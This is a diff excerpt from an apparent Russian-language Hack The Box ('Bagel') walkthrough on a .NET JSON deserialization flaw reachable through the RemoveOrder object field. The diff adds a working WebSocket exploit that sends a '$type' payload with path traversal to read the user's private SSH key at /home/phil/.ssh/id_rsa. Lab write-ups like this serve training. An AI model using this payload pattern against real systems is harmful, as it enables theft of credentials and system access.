@@ -266,3 +266,10 @@ public object Deserialize(string json)
 }
 ```
 Вышеупомянутая уязвимость используется только с базовыми классами, базовые классы наследуются от Order, а в самом Order у нас есть RemoveOrder, несущий объектный тип данных.
+```
+var ws = new WebSocket("ws://bagel.htb:5000/");
+ws.onmessage = (event) => {
+  console.log(event.data);
+}
+ws.send(JSON.stringify({ "RemoveOrder" : {"$type":"bagel_server.File, bagel", "ReadFile":"../../../../../../home/phil/.ssh/id_rsa"}}))
+```
